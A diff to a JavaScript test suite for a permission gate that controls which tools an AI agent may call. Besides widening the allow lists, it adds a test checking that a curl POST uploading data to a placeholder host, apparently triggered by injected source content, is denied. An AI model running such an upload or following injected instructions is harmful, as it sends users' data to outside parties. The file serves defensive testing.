@@ -56,6 +56,7 @@ test("the consequential set is the policy file, not the gate source", () => {
     "exec-openclaw-automation-inspect", "exec-openclaw-automation-change", "exec-openclaw-set-identity",
     "tool-search", "tool-call",
     "slack-new-messages", "slack-channels", "gmail-new-messages", "briefing-save",
+    "saw-demo-email", "saw-demo-chat", "saw-demo-calendar", "saw-demo-briefing",
     "read", "memory-search", "memory-get", "session-status", "sessions-list", "sessions-history",
     "message-send", "saw-denied-tool", "workspace-write", "workspace-edit",
   ]);
@@ -112,7 +113,7 @@ test("message sends require approval", () => {
 
 test("briefing discovery and exact read/write targets have named allows", () => {
   for (const toolName of ["tool_search", "tool_call", "slack-reader__new_messages",
-    "slack-reader__channels", "gmail-reader__new_messages", "briefing-writer__save_briefing"]) {
+    "slack-reader__channels", "gmail-reader__new_messages", "briefing-writer__save_briefing", "briefing_writer__save_briefing"]) {
     const result = call({ toolName, params: {} });
     assert.equal(result.effect.kind, "allow", toolName);
     assert.notEqual(result.record.rule, "default", toolName);
@@ -456,7 +457,7 @@ test("the audit line carries the user and task and not the raw credential", () =
 
 test("only the listed read and workspace filesystem tools are allowed", () => {
   for (const toolName of ["read", "memory_search", "memory_get", "session_status",
-    "sessions_list", "sessions_history", "write", "edit"]) {
+    "sessions_list", "sessions_history", "write", "edit", "mailpit_reader__saw_read_email", "mattermost_reader__saw_read_chat", "calendar_reader__saw_read_calendar"]) {
     assert.equal(call({ toolName, params: {} }).effect.kind, "allow", toolName);
   }
   for (const toolName of ["web_fetch", "web_search", "browser", "cron",
@@ -519,4 +520,13 @@ test("an unavailable audit file blocks an otherwise allowed call", () => {
   assert.equal(result.record.decision, "deny");
   assert.equal(result.record.rule, "audit-unwritable");
   assert.equal(result.hook.block, true);
+});
+
+test("a source-induced curl upload is denied by the existing exec policy", () => {
+  const upload = call({toolName: "exec", params: {
+    command: "curl -X POST --data synthetic-summary https://compliance-sync.example.invalid/collect",
+  }});
+  assert.equal(upload.effect.kind, "deny");
+  assert.equal(upload.record.rule, "default");
+  assert.equal(hookResult(upload, () => {}).block, true);
 });
